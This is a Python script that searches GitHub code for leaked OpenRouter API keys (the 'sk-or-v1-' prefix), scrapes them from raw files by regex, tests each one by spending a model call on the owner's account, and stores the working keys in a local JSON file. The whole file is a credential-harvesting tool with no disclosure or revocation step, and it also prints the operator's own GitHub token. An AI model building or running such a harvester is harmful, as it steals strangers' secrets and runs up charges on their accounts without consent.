from openai import OpenAI
import requests
import json
from dotenv import load_dotenv
import os
from os.path import join, dirname
import re

# load .env file
load_dotenv(verbose=True)
dotenv_path = join(dirname(__file__), '.env')
load_dotenv(dotenv_path)
CRED_LIST_FILEPATH = os.environ.get("CRED_LIST_FILEPATH")
GITHUB_API_TOKEN = os.environ.get("GITHUB_API_TOKEN")



# var
page = 1

# validation
if CRED_LIST_FILEPATH is None:
    raise ValueError("CRED_LIST_FILEPATH is not set")
if GITHUB_API_TOKEN is None:
    raise ValueError("GITHUB_API_TOKEN is not set")

print(f"Credentials file path: {CRED_LIST_FILEPATH}")
print(f"Github API token: {GITHUB_API_TOKEN}")

# if cred_list_filepath is not there, then create one
if not os.path.exists(CRED_LIST_FILEPATH):
    data = {
        "credentials": []
    }
    with open(CRED_LIST_FILEPATH, 'w') as f:
        json.dump(data, f)

def search_github_code_urls(cur_page) -> list[str]:
    query = 'sk-or-v1-'
    headers = {'Authorization': f'token {GITHUB_API_TOKEN}'}
    url = 'https://api.github.com/search/code'
    params = {'q': query, 'page': cur_page}
    response = requests.get(url, headers=headers, params=params)
    if response.status_code == 200:
        return map(lambda item: item['html_url'], response.json()['items'])
    else:
        print(f"Error: {response.status_code}")
        return None
    
def extract_credentials(html: str) -> list[str]:
    # regex pattern like  sk-or-v1-?????" or sk-or-v1-?????\n or sk-or-v1-?????` or sk-or-v1-?????'
    # ????? includes a-zA-Z0-9 and .-_ characters
    pattern = r'sk-or-v1-[a-zA-Z0-9.-_]+[`"\'\n]'
    return map(lambda item: item[:-1], re.findall(pattern, html))

def check_key(key: str) -> bool:
    try:
        client = OpenAI(
            base_url="https://openrouter.ai/api/v1",
            api_key=key,
        )

        client.chat.completions.create(
            model="google/gemma-7b-it:nitro",
            messages=[
                {
                    "role": "system",
                    "content": "RETURN ONLY '0' AS YOUR ASSISTANT RESPONSE",
                }
            ],
            max_tokens=1,
            stream=False,
        )

        # if response has choices[0].content then it's valid
        return True

    except Exception as e:
        print(e)
        return False
    
while True:
    html_urls = search_github_code_urls(page)
    if html_urls is None:
        print("No more results")
        break
    for url in html_urls:
        get_raw_url = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob', '')
        cur_html = requests.get(get_raw_url).text
        credentials = extract_credentials(cur_html)
        for cred in credentials:
            print(f"found: {cred}")
            print(f"checking if valid...")
            if check_key(cred):
                print("*"*30)
                print(f"valid!!!")
                print("*"*30)
                with open(CRED_LIST_FILEPATH, 'r') as f:
                    data = json.load(f)
                    if cred not in data['credentials']:
                        data['credentials'].append(cred)
                        with open(CRED_LIST_FILEPATH, 'w') as f:
                            json.dump(data, f)
            else:
                print(f"invalid...")
    page += 1

